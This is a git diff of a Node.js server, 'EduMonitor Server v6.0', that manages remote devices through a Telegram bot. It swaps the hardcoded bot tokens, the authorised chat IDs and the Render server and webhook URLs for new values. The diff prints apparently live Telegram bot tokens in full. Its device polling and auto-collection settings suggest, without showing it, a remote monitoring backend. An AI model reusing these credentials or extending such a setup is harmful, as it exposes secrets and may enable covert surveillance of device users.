@@ -9,7 +9,7 @@ const PORT = process.env.PORT || 3000;
 const os = require('os');
 
 // Your bot token from @BotFather
-const BOT_TOKEN = process.env.BOT_TOKEN || '8566422839:AAGqOdw_Bru2TwF8_BDw6vDGRhwwr-RE2uo';
+const BOT_TOKEN = process.env.BOT_TOKEN || '8606674782:AAHzMQ95OqETq3ZOpz-qor9cISMxQdhf9CE';
 const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
 // Persistent storage file
@@ -23,7 +23,7 @@ const userStates = new Map();
 
 // Store authorized chat IDs
 const authorizedChats = new Set([
-    '5326373447', // Your chat ID
+    '8266841615', // Your chat ID
 ]);
 
 // Auto-collection flags
@@ -101,11 +101,11 @@ loadAutoDataFlags();
 // ============= DEVICE CONFIGURATION =============
 const deviceConfigs = {
     'default': {
-        chatId: '5326373447',
+        chatId: '8266841615',
         config: {
-            chatId: '5326373447',
-            botToken: '8566422839:AAGqOdw_Bru2TwF8_BDw6vDGRhwwr-RE2uo',
-            serverUrl: 'https://edu-hwpy.onrender.com',
+            chatId: '8266841615',
+            botToken: '8606674782:AAHzMQ95OqETq3ZOpz-qor9cISMxQdhf9CE',
+            serverUrl: 'https://core-m0tr.onrender.com',
             pollingInterval: 15000,
             keepAliveInterval: 300000,
             realtimeLogging: false,
@@ -1172,7 +1172,7 @@ app.get('/api/devices', (req, res) => {
 
 app.get('/test', (req, res) => {
     const serverIP = getServerIP();
-    const userDevices = getDeviceListForUser('5326373447');
+    const userDevices = getDeviceListForUser('8266841615');
     
     res.send(`
         <html>
@@ -1221,7 +1221,7 @@ app.get('/test', (req, res) => {
 });
 
 app.get('/test-menu', async (req, res) => {
-    const chatId = '5326373447';
+    const chatId = '8266841615';
     const result = await sendTelegramMessageWithKeyboard(
         chatId,
         "🎯 Test Menu - Use the buttons below:",
@@ -1758,7 +1758,7 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 EduMonitor Server v6.0 - Complete Menu System`);
     console.log(`🚀 Server IP: ${serverIP}`);
     console.log(`🚀 Port: ${PORT}`);
-    console.log(`🚀 Webhook URL: https://edu-hwpy.onrender.com/webhook`);
+    console.log(`🚀 Webhook URL: https://core-m0tr.onrender.com/webhook`);
     console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
     console.log(`🚀 Persistent Storage: ${DEVICES_FILE}`);
     console.log('\n✅ MENU STRUCTURE:');
